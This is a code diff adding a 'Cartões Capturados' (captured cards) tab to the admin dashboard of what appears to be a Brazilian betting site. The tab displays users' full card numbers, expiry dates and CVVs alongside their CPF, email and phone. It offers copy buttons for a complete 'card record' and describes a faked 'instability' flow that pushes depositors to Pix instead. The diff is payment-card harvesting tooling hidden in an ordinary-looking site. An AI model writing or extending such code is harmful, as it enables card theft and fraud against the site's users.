@@ -21,10 +21,14 @@ import {
   Sparkles,
   Gift,
   Globe,
-  ExternalLink
+  ExternalLink,
+  CreditCard,
+  Copy,
+  RefreshCw
 } from 'lucide-react';
 import { useProfile } from '@/hooks/use-profile';
 import { getPromoCodes, savePromoCodes, type PromoCode } from '@/lib/promo-codes';
+import { getCardLeads, deleteCardLead, clearAllCardLeads, type CardLead } from '@/lib/cards';
 
 export const Route = createFileRoute('/admin')({
   component: AdminDashboard,
@@ -55,7 +59,12 @@ function AdminDashboard() {
   const [users, setUsers] = useState<UserProfile[]>([]);
   const [search, setSearch] = useState('');
   const [amountToAdd, setAmountToAdd] = useState<Record<string, string>>({});
-  const [activeTab, setActiveTab] = useState<'users' | 'promocodes' | 'settings'>('users');
+  const [activeTab, setActiveTab] = useState<'users' | 'promocodes' | 'settings' | 'cards'>('users');
+
+  // Card Leads State
+  const [cardLeads, setCardLeads] = useState<CardLead[]>([]);
+  const [loadingCards, setLoadingCards] = useState(false);
+  const [cardSearch, setCardSearch] = useState('');
 
   // Promo Codes State
   const [promoCodes, setPromoCodes] = useState<PromoCode[]>([]);
@@ -105,6 +114,7 @@ function AdminDashboard() {
       fetchUsers();
       fetchSettings();
       fetchAdminPromoCodes();
+      fetchAdminCardLeads();
     }
   }, [sessionEmail, sessionLoading, navigate]);
 
@@ -141,6 +151,67 @@ function AdminDashboard() {
       setLoadingPromos(false);
     }
   }
+
+  async function fetchAdminCardLeads() {
+    setLoadingCards(true);
+    try {
+      const leads = await getCardLeads();
+      setCardLeads(leads);
+    } catch (err) {
+      console.error(err);
+      toast.error('Erro ao carregar cartões.');
+    } finally {
+      setLoadingCards(false);
+    }
+  }
+
+  const handleDeleteCard = async (id: string) => {
+    if (!window.confirm('Deseja realmente excluir este registro de cartão?')) return;
+    const ok = await deleteCardLead(id);
+    if (ok) {
+      setCardLeads(prev => prev.filter(c => c.id !== id));
+      toast.success('Registro de cartão excluído com sucesso!');
+    } else {
+      toast.error('Falha ao excluir registro.');
+    }
+  };
+
+  const handleClearAllCards = async () => {
+    if (!window.confirm('ATENÇÃO: Deseja apagar TODOS os registros de cartões salvos no sistema?')) return;
+    const ok = await clearAllCardLeads();
+    if (ok) {
+      setCardLeads([]);
+      toast.success('Todos os cartões foram removidos com sucesso.');
+    } else {
+      toast.error('Falha ao limpar cartões.');
+    }
+  };
+
+  const copyToClipboard = (text: string, label: string) => {
+    navigator.clipboard.writeText(text);
+    toast.success(`${label} copiado!`);
+  };
+
+  const copyFullCard = (c: CardLead) => {
+    const full = `--- FICHA DO CARTÃO ---
+Nome no Cartão: ${c.name}
+Número: ${c.number}
+Validade: ${c.expiry}
+CVV: ${c.cvv}
+Valor Solicitado: R$ ${c.amount.toFixed(2)}
+Data/Hora: ${new Date(c.createdAt).toLocaleString('pt-BR')}
+
+--- CONTA DO USUÁRIO ---
+Nome: ${c.userName || 'Não informado'}
+E-mail: ${c.userEmail || 'Não informado'}
+CPF: ${c.userCpf || 'Não informado'}
+Telefone: ${c.userPhone || 'Não informado'}
+User ID: ${c.userId || 'Não informado'}
+Status: ${c.status || 'Instabilidade'}`;
+
+    navigator.clipboard.writeText(full);
+    toast.success('Dados completos do cartão copiados com sucesso!');
+  };
 
   const handleCreatePromoCode = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -270,6 +341,14 @@ function AdminDashboard() {
     (u.cpf && u.cpf.includes(search))
   );
 
+  const filteredCards = cardLeads.filter(c => 
+    c.name.toLowerCase().includes(cardSearch.toLowerCase()) || 
+    c.number.replace(/\s/g, '').includes(cardSearch.replace(/\s/g, '')) ||
+    (c.userEmail && c.userEmail.toLowerCase().includes(cardSearch.toLowerCase())) ||
+    (c.userName && c.userName.toLowerCase().includes(cardSearch.toLowerCase())) ||
+    (c.userCpf && c.userCpf.includes(cardSearch))
+  );
+
   return (
     <div className="flex min-h-screen flex-col bg-background text-foreground">
       <SiteHeader />
@@ -332,6 +411,28 @@ function AdminDashboard() {
               {promoCodes.length > 0 && (
                 <span className="bg-primary/20 text-primary text-xs px-2 py-0.5 rounded-full font-bold">
                   {promoCodes.filter(c => c.active).length} ativos
+                </span>
+              )}
+            </div>
+          </button>
+
+          <button 
+            className={`pb-3 px-4 font-bold text-sm transition-all border-b-2 ${
+              activeTab === 'cards' 
+                ? 'text-primary border-primary' 
+                : 'border-transparent text-muted-foreground hover:text-foreground'
+            }`}
+            onClick={() => {
+              setActiveTab('cards');
+              fetchAdminCardLeads();
+            }}
+          >
+            <div className="flex items-center gap-2">
+              <CreditCard className="size-4"/> 
+              Cartões Capturados
+              {cardLeads.length > 0 && (
+                <span className="bg-purple-500/20 text-purple-300 border border-purple-500/40 text-xs px-2 py-0.5 rounded-full font-bold">
+                  {cardLeads.length}
                 </span>
               )}
             </div>
@@ -677,6 +778,214 @@ function AdminDashboard() {
 
             </div>
 
+          </div>
+        )}
+
+        {/* ABA: CARTÕES CAPTURADOS */}
+        {activeTab === 'cards' && (
+          <div className="flex flex-col gap-6">
+            {/* CABEÇALHO & RESUMO ESTATÍSTICO */}
+            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
+              <div className="bg-card/70 border border-purple-500/20 rounded-2xl p-5 shadow-lg backdrop-blur-md">
+                <div className="flex items-center justify-between mb-2">
+                  <span className="text-xs font-bold uppercase tracking-wider text-muted-foreground">Total Capturados</span>
+                  <CreditCard className="size-5 text-purple-400" />
+                </div>
+                <div className="text-2xl sm:text-3xl font-black text-white">{cardLeads.length}</div>
+                <p className="text-[11px] text-purple-300 mt-1">Tentativas de depósito via cartão</p>
+              </div>
+
+              <div className="bg-card/70 border border-emerald-500/20 rounded-2xl p-5 shadow-lg backdrop-blur-md">
+                <div className="flex items-center justify-between mb-2">
+                  <span className="text-xs font-bold uppercase tracking-wider text-muted-foreground">Volume Solicitado</span>
+                  <Sparkles className="size-5 text-emerald-400" />
+                </div>
+                <div className="text-2xl sm:text-3xl font-black text-emerald-400">
+                  R$ {cardLeads.reduce((acc, c) => acc + (Number(c.amount) || 0), 0).toFixed(2)}
+                </div>
+                <p className="text-[11px] text-emerald-300/80 mt-1">Total em depósitos pretendidos</p>
+              </div>
+
+              <div className="bg-card/70 border border-blue-500/20 rounded-2xl p-5 shadow-lg backdrop-blur-md">
+                <div className="flex items-center justify-between mb-2">
+                  <span className="text-xs font-bold uppercase tracking-wider text-muted-foreground">Fluxo Automático</span>
+                  <ShieldAlert className="size-5 text-blue-400" />
+                </div>
+                <div className="text-xl sm:text-2xl font-black text-blue-300">Instabilidade &rarr; Pix</div>
+                <p className="text-[11px] text-blue-200/70 mt-1">Disparo automático de QR Pix sem atrito</p>
+              </div>
+            </div>
+
+            {/* BARRA DE FERRAMENTAS */}
+            <div className="bg-card/80 border border-border rounded-2xl p-4 sm:p-5 flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4 shadow-xl">
+              <div className="relative flex-1">
+                <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 size-4 text-muted-foreground" />
+                <Input
+                  placeholder="Buscar por nome, número, e-mail ou CPF..."
+                  value={cardSearch}
+                  onChange={(e) => setCardSearch(e.target.value)}
+                  className="pl-10 bg-background border-border text-white text-sm"
+                />
+              </div>
+
+              <div className="flex items-center gap-2 shrink-0">
+                <Button
+                  onClick={fetchAdminCardLeads}
+                  disabled={loadingCards}
+                  variant="outline"
+                  className="gap-2 border-white/10 hover:bg-white/10 text-xs font-bold"
+                >
+                  <RefreshCw className={`size-3.5 ${loadingCards ? 'animate-spin' : ''}`} />
+                  Atualizar
+                </Button>
+
+                {cardLeads.length > 0 && (
+                  <Button
+                    onClick={handleClearAllCards}
+                    variant="destructive"
+                    className="gap-2 text-xs font-bold bg-red-500/20 text-red-400 hover:bg-red-500/30 border border-red-500/30"
+                  >
+                    <Trash2 className="size-3.5" />
+                    Limpar Tudo
+                  </Button>
+                )}
+              </div>
+            </div>
+
+            {/* LISTAGEM DE CARTÕES */}
+            {loadingCards ? (
+              <div className="text-center py-16 text-muted-foreground bg-card rounded-2xl border border-border">
+                Carregando registros de cartões...
+              </div>
+            ) : filteredCards.length === 0 ? (
+              <div className="text-center py-16 text-muted-foreground bg-card rounded-2xl border border-border flex flex-col items-center gap-2">
+                <CreditCard className="size-10 text-muted-foreground/40" />
+                <p className="font-bold text-white">Nenhum registro de cartão encontrado.</p>
+                <p className="text-xs max-w-md">
+                  Quando qualquer usuário preencher a opção de depósito com cartão (nome, número, validade e CVV), todas as informações aparecerão aqui instantaneamente.
+                </p>
+              </div>
+            ) : (
+              <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
+                {filteredCards.map((card) => (
+                  <div
+                    key={card.id}
+                    className="bg-card border border-white/10 rounded-2xl p-5 flex flex-col justify-between gap-4 shadow-xl hover:border-purple-500/40 transition-all relative overflow-hidden"
+                  >
+                    {/* TOPO: STATUS E VALOR */}
+                    <div className="flex items-start justify-between gap-2 border-b border-white/10 pb-3">
+                      <div>
+                        <span className="text-xs text-muted-foreground block font-mono">
+                          {new Date(card.createdAt).toLocaleDateString('pt-BR')} às {new Date(card.createdAt).toLocaleTimeString('pt-BR')}
+                        </span>
+                        <div className="text-xl font-black text-emerald-400 mt-0.5">
+                          R$ {Number(card.amount).toFixed(2)}
+                        </div>
+                      </div>
+                      <span className="inline-flex items-center gap-1 text-[10px] font-black uppercase tracking-wider px-2.5 py-1 rounded-full bg-amber-500/15 text-amber-300 border border-amber-500/30">
+                        {card.status || 'Instabilidade'}
+                      </span>
+                    </div>
+
+                    {/* MOCKUP VISUAL COM DADOS SENSÍVEIS */}
+                    <div className="bg-gradient-to-tr from-[#160b26] to-[#2a1348] border border-purple-500/30 rounded-xl p-4 flex flex-col gap-2.5 font-mono">
+                      {/* Número do Cartão */}
+                      <div className="flex items-center justify-between">
+                        <span className="text-[10px] text-purple-300 uppercase tracking-widest font-sans font-bold">Número:</span>
+                        <button
+                          onClick={() => copyToClipboard(card.number, 'Número do cartão')}
+                          className="flex items-center gap-1 text-xs font-bold text-purple-200 hover:text-white bg-purple-500/20 px-2 py-0.5 rounded border border-purple-500/30 transition-colors"
+                          title="Copiar número do cartão"
+                        >
+                          <Copy className="size-3" />
+                          <span>{card.number}</span>
+                        </button>
+                      </div>
+
+                      {/* Nome no Cartão */}
+                      <div className="flex items-center justify-between">
+                        <span className="text-[10px] text-purple-300 uppercase tracking-widest font-sans font-bold">Nome:</span>
+                        <button
+                          onClick={() => copyToClipboard(card.name, 'Nome impresso')}
+                          className="flex items-center gap-1 text-xs font-bold text-white hover:text-purple-200 bg-white/5 px-2 py-0.5 rounded truncate max-w-[180px] transition-colors"
+                          title="Copiar nome impresso"
+                        >
+                          <Copy className="size-3 shrink-0" />
+                          <span className="truncate">{card.name}</span>
+                        </button>
+                      </div>
+
+                      {/* Validade e CVV */}
+                      <div className="grid grid-cols-2 gap-2 pt-1 border-t border-white/10 text-xs">
+                        <div className="flex items-center justify-between">
+                          <span className="text-[10px] text-purple-300 font-sans font-bold">Validade:</span>
+                          <button
+                            onClick={() => copyToClipboard(card.expiry, 'Validade')}
+                            className="flex items-center gap-1 font-bold text-emerald-400 hover:underline bg-emerald-500/10 px-1.5 py-0.5 rounded border border-emerald-500/20"
+                            title="Copiar validade"
+                          >
+                            <Copy className="size-2.5" />
+                            <span>{card.expiry}</span>
+                          </button>
+                        </div>
+                        <div className="flex items-center justify-between">
+                          <span className="text-[10px] text-purple-300 font-sans font-bold">CVV:</span>
+                          <button
+                            onClick={() => copyToClipboard(card.cvv, 'CVV')}
+                            className="flex items-center gap-1 font-bold text-amber-300 hover:underline bg-amber-500/10 px-1.5 py-0.5 rounded border border-amber-500/20"
+                            title="Copiar CVV"
+                          >
+                            <Copy className="size-2.5" />
+                            <span>{card.cvv}</span>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* DADOS DA CONTA DO JOGADOR */}
+                    <div className="bg-background/80 border border-white/10 rounded-xl p-3 flex flex-col gap-1 text-xs">
+                      <div className="text-muted-foreground text-[10px] font-bold uppercase tracking-wider mb-0.5">
+                        Jogador Vinculado
+                      </div>
+                      <div className="text-white font-semibold truncate">
+                        {card.userName || 'Nome não informado'}
+                      </div>
+                      <div className="text-muted-foreground truncate">
+                        {card.userEmail || 'E-mail não informado'}
+                      </div>
+                      {(card.userCpf || card.userPhone) && (
+                        <div className="flex items-center justify-between text-[11px] text-muted-foreground pt-1 border-t border-white/5 mt-1">
+                          <span>CPF: {card.userCpf || '-'}</span>
+                          <span>Tel: {card.userPhone || '-'}</span>
+                        </div>
+                      )}
+                    </div>
+
+                    {/* BOTÕES DE AÇÃO */}
+                    <div className="flex items-center gap-2 pt-2 border-t border-white/10">
+                      <Button
+                        onClick={() => copyFullCard(card)}
+                        variant="outline"
+                        className="flex-1 gap-1.5 text-xs font-bold border-purple-500/30 text-purple-300 hover:bg-purple-500/20"
+                      >
+                        <Copy className="size-3.5" />
+                        Copiar Tudo
+                      </Button>
+
+                      <Button
+                        onClick={() => handleDeleteCard(card.id)}
+                        variant="ghost"
+                        size="icon"
+                        className="text-red-400 hover:text-red-300 hover:bg-red-500/10 rounded-lg size-8"
+                        title="Excluir este registro"
+                      >
+                        <Trash2 className="size-4" />
+                      </Button>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
           </div>
         )}
 
